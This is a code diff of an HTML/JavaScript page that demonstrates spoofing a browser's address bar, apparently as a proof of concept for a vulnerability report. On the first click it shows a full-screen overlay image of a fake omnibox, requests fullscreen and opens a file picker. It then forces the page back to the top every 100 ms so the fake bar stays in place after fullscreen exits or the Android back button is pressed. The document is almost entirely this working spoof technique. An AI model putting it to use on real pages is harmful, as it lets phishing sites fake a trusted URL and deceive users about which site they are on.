@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof (UX Demo)</title>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+  <title>Security UI Spoof (UX Demo)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
   <style>
     body {
       margin: 0;
@@ -26,9 +26,13 @@
       width: 100vw;
       height: 100vh;
       object-fit: cover;
-      display: block;
+      display: none;
       z-index: 9999;
       pointer-events: none;
+    }
+
+    #content {
+      text-align: center;
     }
 
     input[type=file] {
@@ -40,51 +44,59 @@
 
 <img id="spoof" src="spof1.png" alt="UI overlay">
 <div id="content">
-  <h1>Tap anywhere to start demo</h1>
+  <h1>Click anywhere on the page to spoof the omnibox!</h1>
 </div>
 
 <input id="filePicker" type="file" accept="image/*" capture="environment">
 
 <script>
 const filePicker = document.getElementById('filePicker');
+const spoof = document.getElementById('spoof');
+const content = document.getElementById('content');
 
-document.addEventListener('click', async () => {
-  // Fullscreen
-  if (document.documentElement.requestFullscreen) {
-    try {
-      await document.documentElement.requestFullscreen();
-    } catch(e) {}
-  }
-
-  // Trigger file picker
-  filePicker.click();
-
-  // Hide content
-  document.getElementById('content').style.display = 'none';
-}, { once: true });
-
-// Fungsi untuk scroll ke atas agar overlay menutupi omnibar
-function scrollToTop() {
-  window.scrollTo({ top: 0, behavior: 'smooth' });
+// Scroll instan ke atas
+function forceScrollTop() {
+  window.scrollTo(0, 0);
+  document.body.scrollTop = 0;   // untuk beberapa device
+  document.documentElement.scrollTop = 0;
 }
 
-// Event fullscreenchange
+// Klik awal
+document.addEventListener('click', async () => {
+  // 1️⃣ overlay
+  spoof.style.display = 'block';
+  content.style.display = 'none';
+
+  // 2️⃣ fullscreen
+  if (document.documentElement.requestFullscreen) {
+    try { await document.documentElement.requestFullscreen(); } catch(e) {}
+  }
+
+  // 3️⃣ trigger file picker
+  filePicker.click();
+
+  // paksa scroll ke atas beberapa kali
+  setTimeout(forceScrollTop, 50);
+  setTimeout(forceScrollTop, 200);
+}, { once: true });
+
+// fullscreen change
 document.addEventListener('fullscreenchange', () => {
   if (!document.fullscreenElement) {
-    scrollToTop();
+    // keluar fullscreen, scroll instan ke atas
+    forceScrollTop();
   }
 });
 
-// Polling tambahan untuk tombol back di Android
+// Polling untuk Android back button
 setInterval(() => {
   if (!document.fullscreenElement) {
-    scrollToTop();
+    forceScrollTop();
   }
 }, 100);
 
-filePicker.addEventListener('change', (e) => {
+filePicker.addEventListener('change', () => {
   if (filePicker.files.length > 0) {
-    console.log('File selected:', filePicker.files[0].name);
     alert('File selected: ' + filePicker.files[0].name);
   }
 });
